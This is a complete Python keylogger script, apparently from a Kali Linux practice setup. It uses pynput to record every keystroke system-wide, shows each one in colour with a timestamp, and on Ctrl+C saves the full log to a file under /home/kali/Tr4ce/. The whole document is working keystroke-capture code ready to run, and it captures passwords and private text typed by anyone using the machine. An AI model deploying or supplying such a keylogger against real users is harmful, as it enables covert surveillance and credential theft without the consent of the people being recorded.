from pynput import keyboard
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

keystrokes = []

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        k = key.char
        color = Style.BRIGHT + Fore.GREEN  # Bold Green for regular keys
    except AttributeError:
        k = str(key)
        color = Fore.BLUE  # Blue for special keys

    log_entry = f"[{timestamp}] Key Pressed: {k}"
    keystrokes.append(log_entry)

    # Display: [timestamp] Key Pressed: key
    print(
        f"{Fore.WHITE}[{timestamp}]{Style.RESET_ALL} "
        f"{Fore.RED}Key Pressed:{Style.RESET_ALL} "
        f"{color}{k}{Style.RESET_ALL}"
    )

def on_release(key):
    pass

listener = keyboard.Listener(on_press=on_press, on_release=on_release)

print("Keylogger started... Press Ctrl+C to stop.")

try:
    listener.start()
    listener.join()
except KeyboardInterrupt:
    log_dir = "/home/kali/Tr4ce/"
    filename = "keylog-" + datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
    filepath = log_dir + filename

    with open(filepath, "w") as f:
        for entry in keystrokes:
            f.write(f"{entry}\n")

    print(f"\n[+] Keystrokes saved to: {filepath}")
